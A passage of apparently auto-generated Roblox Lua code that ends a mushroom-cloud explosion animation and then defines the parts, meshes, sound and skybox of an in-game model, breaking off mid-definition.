				PoleBase.Position = Pos+Vector3.new(0,0.1*resize,0)
				PoleRing.Position = Pos+Vector3.new(0,1.3*resize,0)
			end)
		end
		done2 = true
	end)
	wait(2)
	for y = 0.6,0,-0.0025 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(0.9,y,0)
		end
	end
	for r = 0.9,0.5,-0.01 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(r,0,0)
		end
	end
	for by = 0,0.5,0.005 do
		wait()
		for i , v in ipairs(Clouds) do
			v.Mesh.VertexColor = Vector3.new(0.5,by,by)
			v.Transparency = by*2
		end
		Base.Mesh.Scale = Base.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		TopCloud.Mesh.Scale = TopCloud.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		MushCloud.Mesh.Scale = MushCloud.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud1.Mesh.Scale = Cloud1.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud2.Mesh.Scale = Cloud2.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		Cloud3.Mesh.Scale = Cloud3.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		PoleBase.Mesh.Scale = PoleBase.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
		PoleRing.Mesh.Scale = PoleRing.Mesh.Scale+Vector3.new(0.1,0.1,0.1)
	end
	done3 = true
	while true do wait(1) if done1 and done2 and done3 then break end end
	Exp:remove()
	wait(20)
	Sky:remove()
end


	

Explode(BasePosition)

script.Parent:remove()



	
	




end))
Sound121.Name = "Explode"
Sound121.Parent = Script120
Sound121.Pitch = 0.5
Sound121.SoundId = "http://www.roblox.com/asset?id=130768997"
Sound121.Volume = 1
Sky122.Parent = Script120
Sky122.SkyboxBk = "http://www.roblox.com/asset/?version=1&id=1012890"
Sky122.SkyboxDn = "http://www.roblox.com/asset/?version=1&id=1012891"
Sky122.SkyboxFt = "http://www.roblox.com/asset/?version=1&id=1012887"
Sky122.SkyboxLf = "http://www.roblox.com/asset/?version=1&id=1012889"
Sky122.SkyboxRt = "http://www.roblox.com/asset/?version=1&id=1012888"
Sky122.SkyboxUp = "http://www.roblox.com/asset/?version=1&id=1014449"
Part123.Parent = Model0
Part123.Material = Enum.Material.Ice
Part123.BrickColor = BrickColor.new("Dark stone grey")
Part123.Transparency = 0.5
Part123.Rotation = Vector3.new(7.5999999, 0, 0)
Part123.CanCollide = false
Part123.FormFactor = Enum.FormFactor.Custom
Part123.Size = Vector3.new(3, 2.5999999, 0.200000003)
Part123.CFrame = CFrame.new(-24.2097893, 8.72938347, 31.1316738, 1, 1.75870337e-05, 6.18270788e-05, -9.95769551e-06, 0.991205812, -0.132270217, -7.78449903e-05, 0.132281274, 0.991214573)
Part123.BackSurface = Enum.SurfaceType.Weld
Part123.BottomSurface = Enum.SurfaceType.Weld
Part123.FrontSurface = Enum.SurfaceType.Weld
Part123.LeftSurface = Enum.SurfaceType.Weld
Part123.RightSurface = Enum.SurfaceType.Weld
Part123.TopSurface = Enum.SurfaceType.Weld
Part123.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part123.Position = Vector3.new(-24.2097893, 8.72938347, 31.1316738)
Part123.Orientation = Vector3.new(7.5999999, 0, 0)
Part123.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh124.Parent = Part123
BlockMesh124.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh124.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh124.Scale = Vector3.new(1, 1.14999998, 0.5)
Part125.Parent = Model0
Part125.Material = Enum.Material.Metal
Part125.BrickColor = BrickColor.new("Grime")
Part125.Rotation = Vector3.new(172.399994, 0, 180)
Part125.CanCollide = false
Part125.FormFactor = Enum.FormFactor.Custom
Part125.Size = Vector3.new(3, 0.400000006, 0.200000003)
Part125.CFrame = CFrame.new(-24.2096195, 10.2178173, 46.3855438, -1, -5.60768513e-07, -8.06703756e-05, 1.13161541e-05, 0.991207719, -0.132315725, 0.000104148734, -0.132298887, -0.991209865)
Part125.BackSurface = Enum.SurfaceType.Weld
Part125.BottomSurface = Enum.SurfaceType.Weld
Part125.FrontSurface = Enum.SurfaceType.Weld
Part125.LeftSurface = Enum.SurfaceType.Weld
Part125.RightSurface = Enum.SurfaceType.Weld
Part125.TopSurface = Enum.SurfaceType.Weld
Part125.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part125.Position = Vector3.new(-24.2096195, 10.2178173, 46.3855438)
Part125.Orientation = Vector3.new(7.5999999, -180, 0)
Part125.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh126.Parent = Part125
BlockMesh126.Offset = Vector3.new(0, 0, 0.200000003)
Part127.Parent = Model0
Part127.Material = Enum.Material.Ice
Part127.BrickColor = BrickColor.new("Dark stone grey")
Part127.Transparency = 0.5
Part127.Rotation = Vector3.new(-180, 0, -180)
Part127.CanCollide = false
Part127.FormFactor = Enum.FormFactor.Custom
Part127.Size = Vector3.new(4.4000001, 1.79999995, 0.200000003)
Part127.CFrame = CFrame.new(-23.5096817, 9.10065365, 36.3602753, -1, 9.14261545e-06, -6.24489476e-05, 9.84558574e-06, 0.99999088, 2.81994267e-06, 7.66839075e-05, 1.28775291e-05, -1.00000012)
Part127.BackSurface = Enum.SurfaceType.Weld
Part127.BottomSurface = Enum.SurfaceType.Weld
Part127.FrontSurface = Enum.SurfaceType.Weld
Part127.LeftSurface = Enum.SurfaceType.Weld
Part127.RightSurface = Enum.SurfaceType.Weld
Part127.TopSurface = Enum.SurfaceType.Weld
Part127.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part127.Position = Vector3.new(-23.5096817, 9.10065365, 36.3602753)
Part127.Orientation = Vector3.new(0, -180, 0)
Part127.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh128.Parent = Part127
BlockMesh128.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh128.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh128.Scale = Vector3.new(1, 1.14999998, 0.5)
Part129.Parent = Model0
Part129.Material = Enum.Material.Metal
Part129.BrickColor = BrickColor.new("Grime")
Part129.Rotation = Vector3.new(7.5999999, 0, 0)
Part129.CanCollide = false
Part129.FormFactor = Enum.FormFactor.Custom
Part129.Size = Vector3.new(5.80000019, 0.400000036, 0.200000003)
Part129.CFrame = CFrame.new(-19.6098289, 7.63907337, 30.9858189, 1, 1.76825579e-05, 6.23572778e-05, -9.98225096e-06, 0.991205812, -0.132270217, -7.83831638e-05, 0.132281274, 0.991214573)
Part129.BackSurface = Enum.SurfaceType.Weld
Part129.BottomSurface = Enum.SurfaceType.Weld
Part129.FrontSurface = Enum.SurfaceType.Weld
Part129.LeftSurface = Enum.SurfaceType.Weld
Part129.RightSurface = Enum.SurfaceType.Weld
Part129.TopSurface = Enum.SurfaceType.Weld
Part129.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part129.Position = Vector3.new(-19.6098289, 7.63907337, 30.9858189)
Part129.Orientation = Vector3.new(7.5999999, 0, 0)
Part129.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh130.Parent = Part129
BlockMesh130.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh130.Scale = Vector3.new(1, 1.14999998, 1)
BlockMesh130.Scale = Vector3.new(1, 1.14999998, 1)
Part131.Parent = Model0
Part131.Material = Enum.Material.Ice
Part131.BrickColor = BrickColor.new("Dark stone grey")
Part131.Transparency = 0.5
Part131.Rotation = Vector3.new(7.5999999, 0, 0)
Part131.CanCollide = false
Part131.FormFactor = Enum.FormFactor.Custom
Part131.Size = Vector3.new(5.80000019, 2, 0.200000003)
Part131.CFrame = CFrame.new(-19.8097687, 8.82844543, 31.1445694, 1, 1.76347712e-05, 6.20919236e-05, -9.96978906e-06, 0.991205275, -0.132273212, -7.81138588e-05, 0.132284284, 0.991213918)
Part131.BackSurface = Enum.SurfaceType.Weld
Part131.BottomSurface = Enum.SurfaceType.Weld
Part131.FrontSurface = Enum.SurfaceType.Weld
Part131.LeftSurface = Enum.SurfaceType.Weld
Part131.RightSurface = Enum.SurfaceType.Weld
Part131.TopSurface = Enum.SurfaceType.Weld
Part131.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part131.Position = Vector3.new(-19.8097687, 8.82844543, 31.1445694)
Part131.Orientation = Vector3.new(7.5999999, 0, 0)
Part131.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh132.Parent = Part131
BlockMesh132.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh132.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh132.Scale = Vector3.new(1, 1.14999998, 0.5)
Part133.Parent = Model0
Part133.Material = Enum.Material.Metal
Part133.BrickColor = BrickColor.new("Grime")
Part133.CanCollide = false
Part133.FormFactor = Enum.FormFactor.Custom
Part133.Size = Vector3.new(10.1999998, 0.999999881, 2.79999995)
Part133.CFrame = CFrame.new(0.190229297, 10.7005215, 34.0595284, 1, 8.29581222e-06, 4.42689707e-05, -8.66455866e-06, 0.99999088, 2.18264177e-06, -5.17070403e-05, 3.0374008e-06, 1.00000012)
Part133.BackSurface = Enum.SurfaceType.Weld
Part133.BottomSurface = Enum.SurfaceType.Weld
Part133.FrontSurface = Enum.SurfaceType.Weld
Part133.LeftSurface = Enum.SurfaceType.Weld
Part133.RightSurface = Enum.SurfaceType.Weld
Part133.TopSurface = Enum.SurfaceType.Weld
Part133.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part133.Position = Vector3.new(0.190229297, 10.7005215, 34.0595284)
Part133.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh134.Parent = Part133
Part135.Parent = Model0
Part135.Material = Enum.Material.Metal
Part135.BrickColor = BrickColor.new("Grime")
Part135.Rotation = Vector3.new(-180, 0, -180)
Part135.CanCollide = false
Part135.FormFactor = Enum.FormFactor.Custom
Part135.Size = Vector3.new(8.80000114, 0.200000003, 4.80000019)
Part135.CFrame = CFrame.new(-21.109726, 10.3005667, 33.8601379, -1, 9.14261545e-06, -6.24489476e-05, 9.84558574e-06, 0.99999088, 2.81994267e-06, 7.66839075e-05, 1.28775291e-05, -1.00000012)
Part135.BackSurface = Enum.SurfaceType.Weld
Part135.BottomSurface = Enum.SurfaceType.Weld
Part135.FrontSurface = Enum.SurfaceType.Weld
Part135.LeftSurface = Enum.SurfaceType.Weld
Part135.RightSurface = Enum.SurfaceType.Weld
Part135.TopSurface = Enum.SurfaceType.Weld
Part135.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part135.Position = Vector3.new(-21.109726, 10.3005667, 33.8601379)
Part135.Orientation = Vector3.new(0, -180, 0)
Part135.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh136.Parent = Part135
Part137.Parent = Model0
Part137.Material = Enum.Material.Metal
Part137.BrickColor = BrickColor.new("Grime")
Part137.Rotation = Vector3.new(7.5999999, 0, 0)
Part137.CanCollide = false
Part137.FormFactor = Enum.FormFactor.Custom
Part137.Size = Vector3.new(3.20000005, 0.400000006, 0.200000003)
Part137.CFrame = CFrame.new(-24.309742, 10.2161369, 31.330101, 1, 1.75873574e-05, 6.18266713e-05, -9.95750725e-06, 0.991204858, -0.132279024, -7.78446993e-05, 0.132290065, 0.991213858)
Part137.BackSurface = Enum.SurfaceType.Weld
Part137.BottomSurface = Enum.SurfaceType.Weld
Part137.FrontSurface = Enum.SurfaceType.Weld
Part137.LeftSurface = Enum.SurfaceType.Weld
Part137.RightSurface = Enum.SurfaceType.Weld
Part137.TopSurface = Enum.SurfaceType.Weld
Part137.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part137.Position = Vector3.new(-24.309742, 10.2161369, 31.330101)
Part137.Orientation = Vector3.new(7.5999999, 0, 0)
Part137.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh138.Parent = Part137
BlockMesh138.Offset = Vector3.new(0, 0, 0.200000003)
Part139.Parent = Model0
Part139.Material = Enum.Material.Metal
Part139.BrickColor = BrickColor.new("Grime")
Part139.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part139.CanCollide = false
Part139.FormFactor = Enum.FormFactor.Custom
Part139.Size = Vector3.new(8.80000114, 0.200000003, 4.80000019)
Part139.CFrame = CFrame.new(-21.1093521, 10.3008881, 43.8603363, -1, 1.11894988e-05, -0.000103796992, 1.19273136e-05, 1, 3.20989275e-05, 0.000118718235, 4.26027473e-05, -1)
Part139.BackSurface = Enum.SurfaceType.Weld
Part139.BottomSurface = Enum.SurfaceType.Weld
Part139.FrontSurface = Enum.SurfaceType.Weld
Part139.LeftSurface = Enum.SurfaceType.Weld
Part139.RightSurface = Enum.SurfaceType.Weld
Part139.TopSurface = Enum.SurfaceType.Weld
Part139.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part139.Position = Vector3.new(-21.1093521, 10.3008881, 43.8603363)
Part139.Orientation = Vector3.new(0, -179.98999, 0)
Part139.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh140.Parent = Part139
Part141.Parent = Model0
Part141.Material = Enum.Material.Metal
Part141.BrickColor = BrickColor.new("Grime")
Part141.Rotation = Vector3.new(7.5999999, 0, 0)
Part141.CanCollide = false
Part141.FormFactor = Enum.FormFactor.Custom
Part141.Size = Vector3.new(5.5999999, 0.600000083, 0.200000003)
Part141.CFrame = CFrame.new(-19.7097855, 10.1169653, 31.3165245, 1, 1.75877558e-05, 6.18268677e-05, -9.95769642e-06, 0.991204143, -0.132281795, -7.78449903e-05, 0.132292852, 0.991212904)
Part141.BackSurface = Enum.SurfaceType.Weld
Part141.BottomSurface = Enum.SurfaceType.Weld
Part141.FrontSurface = Enum.SurfaceType.Weld
Part141.LeftSurface = Enum.SurfaceType.Weld
Part141.RightSurface = Enum.SurfaceType.Weld
Part141.TopSurface = Enum.SurfaceType.Weld
Part141.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part141.Position = Vector3.new(-19.7097855, 10.1169653, 31.3165245)
Part141.Orientation = Vector3.new(7.5999999, 0, 0)
Part141.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh142.Parent = Part141
BlockMesh142.Offset = Vector3.new(0, 0, 0.200000003)
Part143.Parent = Model0
Part143.Material = Enum.Material.Metal
Part143.BrickColor = BrickColor.new("Grime")
Part143.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part143.CanCollide = false
Part143.FormFactor = Enum.FormFactor.Custom
Part143.Size = Vector3.new(4, 0.200000048, 0.400000006)
Part143.CFrame = CFrame.new(-23.5095596, 10.1009521, 41.6606407, -1, 1.09616185e-05, -9.92156856e-05, 1.215679e-05, 1, 2.88735409e-05, 0.000123329461, 4.58503346e-05, -1)
Part143.BackSurface = Enum.SurfaceType.Weld
Part143.BottomSurface = Enum.SurfaceType.Weld
Part143.FrontSurface = Enum.SurfaceType.Weld
Part143.LeftSurface = Enum.SurfaceType.Weld
Part143.RightSurface = Enum.SurfaceType.Weld
Part143.TopSurface = Enum.SurfaceType.Weld
Part143.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part143.Position = Vector3.new(-23.5095596, 10.1009521, 41.6606407)
Part143.Orientation = Vector3.new(0, -179.98999, 0)
Part143.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh144.Parent = Part143
Part145.Parent = Model0
Part145.Material = Enum.Material.Metal
Part145.BrickColor = BrickColor.new("Grime")
Part145.Rotation = Vector3.new(-180, 0, -180)
Part145.CanCollide = false
Part145.FormFactor = Enum.FormFactor.Custom
Part145.Size = Vector3.new(4, 0.200000048, 0.400000006)
Part145.CFrame = CFrame.new(-23.5096741, 10.1006269, 36.060318, -1, 9.1545362e-06, -6.27174304e-05, 9.85749102e-06, 0.99999088, 3.03555453e-06, 7.69523976e-05, 1.30931385e-05, -1.00000012)
Part145.BackSurface = Enum.SurfaceType.Weld
Part145.BottomSurface = Enum.SurfaceType.Weld
Part145.FrontSurface = Enum.SurfaceType.Weld
Part145.LeftSurface = Enum.SurfaceType.Weld
Part145.RightSurface = Enum.SurfaceType.Weld
Part145.TopSurface = Enum.SurfaceType.Weld
Part145.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part145.Position = Vector3.new(-23.5096741, 10.1006269, 36.060318)
Part145.Orientation = Vector3.new(0, -180, 0)
Part145.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh146.Parent = Part145
Part147.Parent = Model0
Part147.Material = Enum.Material.Ice
Part147.BrickColor = BrickColor.new("Dark stone grey")
Part147.Transparency = 0.5
Part147.Rotation = Vector3.new(0, 0.00999999978, 0)
Part147.CanCollide = false
Part147.FormFactor = Enum.FormFactor.Custom
Part147.Size = Vector3.new(4.4000001, 1.79999995, 0.200000003)
Part147.CFrame = CFrame.new(-23.5096359, 9.10095882, 41.3607674, 1, 1.08327658e-05, 9.66105945e-05, -1.1122107e-05, 1, -2.70385699e-05, -0.000102494581, 3.11788244e-05, 1)
Part147.BackSurface = Enum.SurfaceType.Weld
Part147.BottomSurface = Enum.SurfaceType.Weld
Part147.FrontSurface = Enum.SurfaceType.Weld
Part147.LeftSurface = Enum.SurfaceType.Weld
Part147.RightSurface = Enum.SurfaceType.Weld
Part147.TopSurface = Enum.SurfaceType.Weld
Part147.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part147.Position = Vector3.new(-23.5096359, 9.10095882, 41.3607674)
Part147.Orientation = Vector3.new(0, 0.00999999978, 0)
Part147.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh148.Parent = Part147
BlockMesh148.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh148.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh148.Scale = Vector3.new(1, 1.14999998, 0.5)
Part149.Parent = Model0
Part149.Material = Enum.Material.Metal
Part149.BrickColor = BrickColor.new("Grime")
Part149.Rotation = Vector3.new(172.399994, -0.00999999978, 180)
Part149.CanCollide = false
Part149.FormFactor = Enum.FormFactor.Custom
Part149.Size = Vector3.new(6.20000029, 0.600000083, 0.200000003)
Part149.CFrame = CFrame.new(-19.8094444, 10.1184397, 46.3984222, -1, -9.0132653e-06, -0.000181728246, 1.62895012e-05, 0.991222322, -0.132206291, 0.00020543822, -0.132189453, -0.991224468)
Part149.BackSurface = Enum.SurfaceType.Weld
Part149.BottomSurface = Enum.SurfaceType.Weld
Part149.FrontSurface = Enum.SurfaceType.Weld
Part149.LeftSurface = Enum.SurfaceType.Weld
Part149.RightSurface = Enum.SurfaceType.Weld
Part149.TopSurface = Enum.SurfaceType.Weld
Part149.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part149.Position = Vector3.new(-19.8094444, 10.1184397, 46.3984222)
Part149.Orientation = Vector3.new(7.5999999, -179.98999, 0)
Part149.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh150.Parent = Part149
BlockMesh150.Offset = Vector3.new(0, 0, 0.200000003)
Part151.Parent = Model0
Part151.Material = Enum.Material.Metal
Part151.BrickColor = BrickColor.new("Grime")
Part151.Rotation = Vector3.new(-180, 0, -180)
Part151.CanCollide = false
Part151.FormFactor = Enum.FormFactor.Custom
Part151.Size = Vector3.new(0.400000125, 0.400000095, 4.80000019)
Part151.CFrame = CFrame.new(-25.7096767, 10.2006121, 33.8604965, -1, 9.1545362e-06, -6.27174304e-05, 9.85749102e-06, 0.99999088, 3.03555453e-06, 7.69523976e-05, 1.30931385e-05, -1.00000012)
Part151.BackSurface = Enum.SurfaceType.Weld
Part151.BottomSurface = Enum.SurfaceType.Weld
Part151.FrontSurface = Enum.SurfaceType.Weld
Part151.LeftSurface = Enum.SurfaceType.Weld
Part151.RightSurface = Enum.SurfaceType.Weld
Part151.TopSurface = Enum.SurfaceType.Weld
Part151.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part151.Position = Vector3.new(-25.7096767, 10.2006121, 33.8604965)
Part151.Orientation = Vector3.new(0, -180, 0)
Part151.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh152.Parent = Part151
Part153.Parent = Model0
Part153.Material = Enum.Material.Ice
Part153.BrickColor = BrickColor.new("Dark stone grey")
Part153.Transparency = 0.5
Part153.Rotation = Vector3.new(0, 90, 0)
Part153.CanCollide = false
Part153.FormFactor = Enum.FormFactor.Custom
Part153.Size = Vector3.new(4.4000001, 2.5999999, 0.200000003)
Part153.CFrame = CFrame.new(-26.0095062, 8.70113087, 44.0608444, -6.27532063e-05, 9.1800166e-06, 1, 6.16025354e-05, 1, -9.47351418e-06, -1, 6.58212812e-05, -6.87484062e-05)
Part153.BackSurface = Enum.SurfaceType.Weld
Part153.BottomSurface = Enum.SurfaceType.Weld
Part153.FrontSurface = Enum.SurfaceType.Weld
Part153.LeftSurface = Enum.SurfaceType.Weld
Part153.RightSurface = Enum.SurfaceType.Weld
Part153.TopSurface = Enum.SurfaceType.Weld
Part153.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part153.Position = Vector3.new(-26.0095062, 8.70113087, 44.0608444)
Part153.Orientation = Vector3.new(0, 90, 0)
Part153.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh154.Parent = Part153
BlockMesh154.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh154.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh154.Scale = Vector3.new(1, 1.14999998, 0.5)
Part155.Parent = Model0
Part155.Material = Enum.Material.Metal
Part155.BrickColor = BrickColor.new("Grime")
Part155.Rotation = Vector3.new(180, 0, -180)
Part155.CanCollide = false
Part155.FormFactor = Enum.FormFactor.Custom
Part155.Size = Vector3.new(0.400000125, 2.60000014, 0.399999619)
Part155.CFrame = CFrame.new(-25.7094059, 8.70073032, 36.0606499, -1, 8.09867561e-06, -4.05344908e-05, 8.86677481e-06, 1, -1.35534392e-05, 5.598793e-05, -2.67428459e-06, -1)
Part155.BackSurface = Enum.SurfaceType.Weld
Part155.BottomSurface = Enum.SurfaceType.Weld
Part155.FrontSurface = Enum.SurfaceType.Weld
Part155.LeftSurface = Enum.SurfaceType.Weld
Part155.RightSurface = Enum.SurfaceType.Weld
Part155.TopSurface = Enum.SurfaceType.Weld
Part155.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part155.Position = Vector3.new(-25.7094059, 8.70073032, 36.0606499)
Part155.Orientation = Vector3.new(0, -180, 0)
Part155.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh156.Parent = Part155
Part157.Parent = Model0
Part157.Material = Enum.Material.Metal
Part157.BrickColor = BrickColor.new("Grime")
Part157.Rotation = Vector3.new(180, 0, -180)
Part157.CanCollide = false
Part157.FormFactor = Enum.FormFactor.Custom
Part157.Size = Vector3.new(0.400000125, 2.60000014, 0.399999619)
Part157.CFrame = CFrame.new(-25.7093887, 8.70087433, 41.6606712, -1, 8.28512475e-06, -4.41889606e-05, 8.58297699e-06, 1, -1.10809588e-05, 5.01835166e-05, -6.86198973e-06, -1)
Part157.BackSurface = Enum.SurfaceType.Weld
Part157.BottomSurface = Enum.SurfaceType.Weld
Part157.FrontSurface = Enum.SurfaceType.Weld
Part157.LeftSurface = Enum.SurfaceType.Weld
Part157.RightSurface = Enum.SurfaceType.Weld
Part157.TopSurface = Enum.SurfaceType.Weld
Part157.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part157.Position = Vector3.new(-25.7093887, 8.70087433, 41.6606712)
Part157.Orientation = Vector3.new(0, -180, 0)
Part157.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh158.Parent = Part157
Part159.Parent = Model0
Part159.Material = Enum.Material.Metal
Part159.BrickColor = BrickColor.new("Grime")
Part159.Transparency = 1
Part159.Rotation = Vector3.new(0, 0, -90)
Part159.CanCollide = false
Part159.FormFactor = Enum.FormFactor.Custom
Part159.Size = Vector3.new(0.600000024, 33.4000015, 1.20000005)
Part159.CFrame = CFrame.new(-4.310009, 11.8002071, 39.1599884, -6.21251684e-06, 1, 6.75599949e-07, -1, -6.68983739e-06, 1.11012896e-05, 4.27564555e-06, -1.03863886e-05, 1)
Part159.BackSurface = Enum.SurfaceType.Weld
Part159.BottomSurface = Enum.SurfaceType.Weld
Part159.FrontSurface = Enum.SurfaceType.Weld
Part159.LeftSurface = Enum.SurfaceType.Weld
Part159.RightSurface = Enum.SurfaceType.Weld
Part159.TopSurface = Enum.SurfaceType.Weld
Part159.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part159.Position = Vector3.new(-4.310009, 11.8002071, 39.1599884)
Part159.Orientation = Vector3.new(0, 0, -90)
Part159.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh160.Parent = Part159
CylinderMesh160.Offset = Vector3.new(6.5, 0, 0)
CylinderMesh160.Scale = Vector3.new(2, 1.5, 1.60000002)
CylinderMesh160.Scale = Vector3.new(2, 1.5, 1.60000002)
Part161.Parent = Model0
Part161.Material = Enum.Material.Metal
Part161.BrickColor = BrickColor.new("Grime")
Part161.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part161.CanCollide = false
Part161.FormFactor = Enum.FormFactor.Custom
Part161.Size = Vector3.new(0.400000125, 0.400000095, 4.80000019)
Part161.CFrame = CFrame.new(-25.7093048, 10.200943, 43.8608704, -1, 1.09616185e-05, -9.92156856e-05, 1.215679e-05, 1, 2.88735409e-05, 0.000123329461, 4.58503346e-05, -1)
Part161.BackSurface = Enum.SurfaceType.Weld
Part161.BottomSurface = Enum.SurfaceType.Weld
Part161.FrontSurface = Enum.SurfaceType.Weld
Part161.LeftSurface = Enum.SurfaceType.Weld
Part161.RightSurface = Enum.SurfaceType.Weld
Part161.TopSurface = Enum.SurfaceType.Weld
Part161.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part161.Position = Vector3.new(-25.7093048, 10.200943, 43.8608704)
Part161.Orientation = Vector3.new(0, -179.98999, 0)
Part161.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh162.Parent = Part161
Part163.Name = "Brick"
Part163.Parent = Model0
Part163.Material = Enum.Material.Metal
Part163.BrickColor = BrickColor.new("Grime")
Part163.Transparency = 1
Part163.Rotation = Vector3.new(-81.8699951, 0, 0)
Part163.CanCollide = false
Part163.FormFactor = Enum.FormFactor.Custom
Part163.Size = Vector3.new(2, 0.200000003, 1.19999993)
Part163.CFrame = CFrame.new(-15.1100616, 9.22443581, 31.4195766, 1, -1.95444609e-05, 1.00356256e-05, -7.23307085e-06, 0.141354978, 0.989949763, -2.19993763e-05, -0.989958763, 0.141357139)
Part163.BackSurface = Enum.SurfaceType.Weld
Part163.BottomSurface = Enum.SurfaceType.Weld
Part163.FrontSurface = Enum.SurfaceType.Weld
Part163.LeftSurface = Enum.SurfaceType.Weld
Part163.RightSurface = Enum.SurfaceType.Weld
Part163.TopSurface = Enum.SurfaceType.Weld
Part163.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part163.Position = Vector3.new(-15.1100616, 9.22443581, 31.4195766)
Part163.Orientation = Vector3.new(-81.8699951, 0, 0)
Part163.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh164.Parent = Part163
BlockMesh164.Offset = Vector3.new(0, -0.189999998, 0)
Part165.Parent = Model0
Part165.Material = Enum.Material.Ice
Part165.BrickColor = BrickColor.new("Dark stone grey")
Part165.Transparency = 0.5
Part165.Rotation = Vector3.new(-0.00999999978, 90, 0)
Part165.CanCollide = false
Part165.FormFactor = Enum.FormFactor.Custom
Part165.Size = Vector3.new(4.4000001, 2.5999999, 0.200000003)
Part165.CFrame = CFrame.new(-26.0100727, 8.70062733, 33.660717, 1.50852629e-05, 8.59109969e-06, 1, -0.000113904629, 0.999991715, -9.33180672e-06, -1.00000143, -0.000103434344, 5.23921777e-08)
Part165.BackSurface = Enum.SurfaceType.Weld
Part165.BottomSurface = Enum.SurfaceType.Weld
Part165.FrontSurface = Enum.SurfaceType.Weld
Part165.LeftSurface = Enum.SurfaceType.Weld
Part165.RightSurface = Enum.SurfaceType.Weld
Part165.TopSurface = Enum.SurfaceType.Weld
Part165.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part165.Position = Vector3.new(-26.0100727, 8.70062733, 33.660717)
Part165.Orientation = Vector3.new(0, 90, -0.00999999978)
Part165.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh166.Parent = Part165
BlockMesh166.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh166.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh166.Scale = Vector3.new(1, 1.14999998, 0.5)
WedgePart167.Parent = Model0
WedgePart167.Material = Enum.Material.Metal
WedgePart167.BrickColor = BrickColor.new("Grime")
WedgePart167.Rotation = Vector3.new(90, 0, 180)
WedgePart167.FormFactor = Enum.FormFactor.Custom
WedgePart167.Size = Vector3.new(10.1999998, 1.60000014, 1.00000012)
WedgePart167.CFrame = CFrame.new(0.190155506, 10.7001343, 31.8595524, -1, -6.39187638e-05, -9.26415669e-06, 9.63382809e-06, -1.61062781e-05, -0.99999088, 7.13567133e-05, -1.00000012, 1.08866034e-05)
WedgePart167.BackSurface = Enum.SurfaceType.Weld
WedgePart167.BottomSurface = Enum.SurfaceType.Weld
WedgePart167.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart167.Position = Vector3.new(0.190155506, 10.7001343, 31.8595524)
WedgePart167.Orientation = Vector3.new(89.7599945, -40.3999977, 149.110001)
WedgePart167.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh168.Parent = WedgePart167
SpecialMesh168.MeshType = Enum.MeshType.Wedge
WedgePart169.Parent = Model0
WedgePart169.Material = Enum.Material.Metal
WedgePart169.BrickColor = BrickColor.new("Grime")
